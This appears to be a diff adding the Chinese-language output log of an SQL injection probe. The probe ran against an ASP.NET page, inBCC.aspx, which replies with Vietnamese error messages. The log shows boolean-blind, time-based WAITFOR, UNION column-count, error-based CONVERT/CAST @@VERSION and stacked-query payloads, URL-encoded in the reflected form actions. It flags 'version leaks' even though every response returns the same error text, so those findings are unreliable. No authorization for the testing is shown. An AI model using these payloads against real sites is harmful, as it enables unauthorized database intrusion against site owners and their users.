@@ -1,0 +1,64 @@
+🔥🔥🔥 SQL注入超深度挖掘
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+[1] 获取基线...
+  基线: 4205 bytes
+  lblNote内容: <span id="lblNote"><b><font color="#FF3300"></font></b></span>
+
+[2] 单引号测试...
+  单引号: 4407 bytes (差异: 202)
+
+[3] 布尔盲注...
+  True:  4438 bytes
+  False: 4438 bytes
+  差异:  0 bytes
+
+[4] 时间盲注测试...
+  正常请求: 0秒
+  WAITFOR 5秒: 1秒
+
+[5] UNION注入列数测试...
+  1 列: 4451 bytes 
+  2 列: 4466 bytes 
+  3 列: 4481 bytes 
+  4 列: 4492 bytes 
+  5 列: 4507 bytes 
+  6 列: 4522 bytes 
+  7 列: 4533 bytes 
+  8 列: 4548 bytes 
+  9 列: 4563 bytes 
+  10 列: 4574 bytes 
+
+[6] 错误注入 - 强制SQL错误...
+  🔥🔥🔥 CONVERT错误泄露!
+    <form method="post" action="./inBCC.aspx?ID=MAU2%27+AND+1%3dCONVERT(INT%2c%40%40VERSION)--" id="form1">
+  🔥🔥🔥 CAST错误泄露!
+    <form method="post" action="./inBCC.aspx?ID=MAU2%27+AND+1%3dCAST(%40%40VERSION+AS+INT)--" id="form1">
+
+[7] 堆叠查询测试...
+  堆叠查询: 4456 bytes
+  🔥🔥🔥 版本信息泄露!
+    <form method="post" action="./inBCC.aspx?ID=MAU2%27%3bSELECT+%40%40VERSION--" id="form1">
+
+[8] 检查所有响应中的lblNote内容...
+  bool_false.html: <span id="lblNote"><b><font color="#FF3300">Không xác định được mẫu biểu cần in.</font></b></span>
+  bool_true.html: <span id="lblNote"><b><font color="#FF3300">Không xác định được mẫu biểu cần in.</font></b></span>
+  error_cast.html: <span id="lblNote"><b><font color="#FF3300">Không xác định được mẫu biểu cần in.</font></b></span>
+  error_convert.html: <span id="lblNote"><b><font color="#FF3300">Không xác định được mẫu biểu cần in.</font></b></span>
+  stack_version.html: <span id="lblNote"><b><font color="#FF3300">Không xác định được mẫu biểu cần in.</font></b></span>
+  test_quote.html: <span id="lblNote"><b><font color="#FF3300">Không xác định được mẫu biểu cần in.</font></b></span>
+  time_delay5.html: <span id="lblNote"><b><font color="#FF3300">Không xác định được mẫu biểu cần in.</font></b></span>
+  union_10.html: <span id="lblNote"><b><font color="#FF3300">Không xác định được mẫu biểu cần in.</font></b></span>
+  union_1.html: <span id="lblNote"><b><font color="#FF3300">Không xác định được mẫu biểu cần in.</font></b></span>
+  union_2.html: <span id="lblNote"><b><font color="#FF3300">Không xác định được mẫu biểu cần in.</font></b></span>
+  union_3.html: <span id="lblNote"><b><font color="#FF3300">Không xác định được mẫu biểu cần in.</font></b></span>
+  union_4.html: <span id="lblNote"><b><font color="#FF3300">Không xác định được mẫu biểu cần in.</font></b></span>
+  union_5.html: <span id="lblNote"><b><font color="#FF3300">Không xác định được mẫu biểu cần in.</font></b></span>
+  union_6.html: <span id="lblNote"><b><font color="#FF3300">Không xác định được mẫu biểu cần in.</font></b></span>
+  union_7.html: <span id="lblNote"><b><font color="#FF3300">Không xác định được mẫu biểu cần in.</font></b></span>
+  union_8.html: <span id="lblNote"><b><font color="#FF3300">Không xác định được mẫu biểu cần in.</font></b></span>
+  union_9.html: <span id="lblNote"><b><font color="#FF3300">Không xác định được mẫu biểu cần in.</font></b></span>
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📊 测试完成
+19
+个HTML文件已生成
